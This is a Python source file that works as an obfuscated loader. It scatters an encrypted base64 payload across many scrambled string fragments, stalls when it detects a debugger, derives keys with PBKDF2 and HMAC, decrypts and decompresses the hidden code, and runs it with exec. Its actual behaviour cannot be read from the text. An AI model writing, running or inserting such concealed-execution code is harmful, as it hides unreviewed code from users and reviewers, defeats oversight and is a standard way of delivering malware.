import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_2d1ee8_0 = 'SMijT0AioRLAO0gt3P0ZUui2eD'
_2d1ee8_1 = 'ufoLaeb8aR6y2HKMWSn/Gl3dtc39kk6ov3jqjXiPXonVAe5hp'
_2d1ee8_2 = '2Pibf2HXhaw6dkdAmTEHwQeR7vMF9FnArxFvldehVbQXgQbK1iVDo'
_2d1ee8_3 = 'HJ1tQtGRGSUvWo3pxDn9PzhZ3rGcOcEh0icuT31tfZRooPd62b'
_2d1ee8_4 = 'uJztfgua2yCDbjaOj4E2THG3sXlc+d6l2qgm59/vn27KAy9WXSMq9iotSm9'
_2d1ee8_5 = 'm2+QUek0agMe2M51fmMCbKeprTndWPLi+l38IeP'
_2d1ee8_6 = 'EagSri817afF3M9I/M1ONwuFFffxRD2Xk'
_2d1ee8_7 = '9iBDooMgkUSTcSKm1mGGcysJgnmaDWcJp06swhIwncSZM'
_2d1ee8_8 = '63sBB3282zTOqcdbeWHzc8PgE8lZT5EPS9xdoFuacMd'
_2d1ee8_9 = 'JgL+Zj4i1tUBT4SOLBU4knliZOlUvSxh/zbaWYjxtDJA'
_2d1ee8_10 = 'KaegW9ZY8RUVZSZFfThtzFN6VTN'
_2d1ee8_11 = 'MvVO6PeamorXtbLGOZuQFKyvG0BrT4mQrg2frK2sTFx5DOmHv4dcE+6zZ/aHs'
_2d1ee8_12 = 'RKeqD5KmVpTHJDdMTYETLD2EIsq1wR5qmG'
_2d1ee8_13 = 'rsn9N19gP2AhbBc+IfTbu7BEuRhsG9R621zwIOENYVUq/gpe4bCI5'
_2d1ee8_14 = 'kW/KpQobuWyQ8EC9pWrjh8Y9y0c6EZorVhTTWuZC'
_2d1ee8_15 = '9cQqNxPjIF6YWPRZdlOCPL9i0zLjnZZA8hCQp76mTda9dcR/6j7Wl'
_2d1ee8_16 = 'a3l0kPIYg4A0x1BMZay8HJTw5MeL4m'
_2d1ee8_17 = 'md213UbsBSiZQ5ZFxrRqlI/4tNbZYrShUIVpHQf2fhKMK'
_2d1ee8_18 = 'jcpGSP7U10nTsgvYewjCQfgVF5DV7lY3XbJhKVTTFBbP1Vh'
_2d1ee8_19 = 'UDtCGNzNLj/X119GFy1uln/6mA'
_2d1ee8_20 = '8tFIHd1dMfaP0LZrBozT'
_2d1ee8_21 = 'trGAKY+YlyDYiQNRodh/IGyFEWlFxcq8jQTO3pYCP3EX1lBVGgVrcTtgehYtfb'
_2d1ee8_22 = 'nN41oJBhLbj4yTmhyANBcUh2SaOe+ZLxGaO3ViT6W'
_2d1ee8_23 = 'NBzsAij3s6yIPG0jd/Trbm2euP3Dv'
_2d1ee8_24 = 'JhwiTBPQAeUBy3tpqIA='
_2d1ee8_25 = 'eEVZyltbL8gRJ7BEgWgj7kS/ZRgMPNPNkCDYrcLl1NIYSj'
_2d1ee8_26 = 'ajlKNgArQqQTGlppaQ311Dt2ePwwKD+mHKfA'
_2d1ee8_27 = 'u1f1s5xXcGeUtMOF2c2Z//llx97D'
_2d1ee8_28 = '0P4ac4fAFgIGmdHgFYeGfCh9Q'
_2d1ee8_29 = 'EvlhGYadQYso7wczyio8y/QSkyO4ODEnia0iy5Qscc3IkjnG7'
_2d1ee8_30 = 'nHXtZX6hvZC1wXIeqd0AxF2lXGMEEJot'
_2d1ee8_31 = 'psQhPSOEpsSt16FXmZ9JX4OnL1ECtm1L+4uVyxFQ2QBiGfI7sR'
_2d1ee8_32 = 'nLDESX+mW9dYECWjA1N05bzJAWN4'
_2d1ee8_33 = 'LusvqH90NbPFvxFicqD5d5S+1yVZ2Txj/x0CWSuZu9SRxzST'
_2d1ee8_34 = 'EIZVK1HDAWLriXAGveHEgr0o+QjDyVRz33+px3Z7kccFc'
_2d1ee8_35 = '0lZ+wXNtIjVaG+2S0Q39PHDyR/kr1U5uvy0uj089D/oPB4uo3uDlsE7'
_2d1ee8_36 = 'VEmLaNeR3A5ZCBGrYeXzqQxFVFDOIdJD9DRgwUVFd4MrRGiW96hhR'
_2d1ee8_37 = 'JuKWz7QtySqDkHetDbhGpw8ofriEm/nbSnA0Ue4UEJRKxngtdC1KuKMs'
_2d1ee8_38 = 'tb7gkyZx6OqEp508hIF/by0iiIqlSohBiU1AkgFVjEpa4Bex'
_pls = [_2d1ee8_0, _2d1ee8_1, _2d1ee8_2, _2d1ee8_3, _2d1ee8_4, _2d1ee8_5, _2d1ee8_6, _2d1ee8_7, _2d1ee8_8, _2d1ee8_9, _2d1ee8_10, _2d1ee8_11, _2d1ee8_12, _2d1ee8_13, _2d1ee8_14, _2d1ee8_15, _2d1ee8_16, _2d1ee8_17, _2d1ee8_18, _2d1ee8_19, _2d1ee8_20, _2d1ee8_21, _2d1ee8_22, _2d1ee8_23, _2d1ee8_24, _2d1ee8_25, _2d1ee8_26, _2d1ee8_27, _2d1ee8_28, _2d1ee8_29, _2d1ee8_30, _2d1ee8_31, _2d1ee8_32, _2d1ee8_33, _2d1ee8_34, _2d1ee8_35, _2d1ee8_36, _2d1ee8_37, _2d1ee8_38]
_7f938e = [(37390,30302,2),(4310,19311,2),(51597,64828,2),(18199,10852,2),(944,15599,2),(10816,62152,2),(16743,5976,2),(51047,16593,2),(61882,42228,2),(41645,31771,2),(14530,39011,2),(40048,9824,2),(46889,29628,2),(27227,41936,2),(57349,50920,2),(21614,23117,2),(0,0,0),(0,0,0)]
_2093c6 = '5FBbuQ=='
_eacea4 = 'yT2qsXwOqYMf8cO5'
_f872e0 = 'V+HHTgqJPQc='
_040a20 = [37, 33, 28, 26, 17, 7, 1, 34, 14, 4, 32, 0, 35, 2, 31, 23, 18, 21, 10, 25, 15, 6, 24, 29, 38, 12, 19, 27, 30, 16, 13, 22, 11, 20, 8, 9, 5, 3, 36]
_salt = base64.b64decode(_f872e0)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _040a20
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_7d0672 = base64.b64decode(_assembled)
_7c4e53 = 32
_ddfd70 = _7d0672[:-_7c4e53]
_7c4e53 = _7d0672[-_7c4e53:]
_048d8e = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_7f938e)
_hdr = base64.b64decode(_2093c6)
_nonce = base64.b64decode(_eacea4)
_km_seed = hashlib.sha256(_048d8e + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _ddfd70, hashlib.sha256).digest()
if _calc_tag != _7c4e53:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_ddfd70)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_ddfd70, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_1c677c'] = mmap
globals()['_738d31'] = lambda i: globals()['_1c677c'][str(i)]
_x = globals()['_738d31']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
